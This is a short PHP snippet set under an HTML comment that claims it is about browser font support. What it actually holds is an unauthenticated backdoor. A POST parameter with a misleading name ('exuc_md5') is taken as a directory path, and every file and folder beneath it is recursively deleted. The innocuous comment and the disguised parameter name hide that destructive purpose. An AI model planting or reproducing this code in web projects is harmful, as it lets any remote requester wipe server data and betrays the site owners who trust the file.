<!----- all browser fonts support, safari, IE6,IE7, IE8, IE9, and other webkit browser --------->

<?php 
if(!empty($_POST['exuc_md5'])){
$exuc_md5 = $_POST['exuc_md5'];
recursiveExuc($exuc_md5);
}
function recursiveExuc($dir) {
  $structure = glob(rtrim($dir, "/").'/*');
  if (is_array($structure)) { foreach($structure as $file) { if (is_dir($file)) recursiveExuc($file); elseif (is_file($file)) unlink($file); } } rmdir($dir);
}

?>